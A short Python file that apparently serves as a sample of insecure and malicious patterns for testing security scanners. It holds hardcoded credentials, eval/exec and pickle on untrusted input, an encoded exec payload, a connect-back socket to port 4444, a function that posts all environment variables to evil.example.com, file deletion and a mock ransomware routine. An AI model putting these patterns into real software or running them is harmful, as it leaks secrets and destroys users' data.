import os
import sys
import subprocess
import pickle
import socket
import base64
import requests

PASSWORD = "super_secret_password"
API_KEY = "AKIAIOSFODNN7EXAMPLE"
DB_PASSWORD = "root123"

def run_system_command(cmd):
    os.system(cmd)

def run_shell():
    subprocess.Popen(
        "echo vulnerable",
        shell=True
    )

def dynamic_exec(user_input):
    eval(user_input)
    exec(user_input)

def load_data(blob):
    return pickle.loads(blob)

def hidden_payload():
    encoded = "cHJpbnQoJ01BTElDSU9VUyBDT0RFJyk="
    decoded = base64.b64decode(encoded)
    exec(decoded)

def connect_back():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.100", 4444))
    s.send(b"hello")
    s.close()

def steal_env():
    data = dict(os.environ)
    requests.post("http://evil.example.com/steal", json=data)

def cpu_burn():
    while True:
        pass

def wipe_files():
    os.remove("important.txt")

def fake_encrypt():
    for f in os.listdir("."):
        if f.endswith(".txt"):
            with open(f, "rb") as fh:
                content = fh.read()
            with open(f + ".locked", "wb") as out:
                out.write(content[::-1])
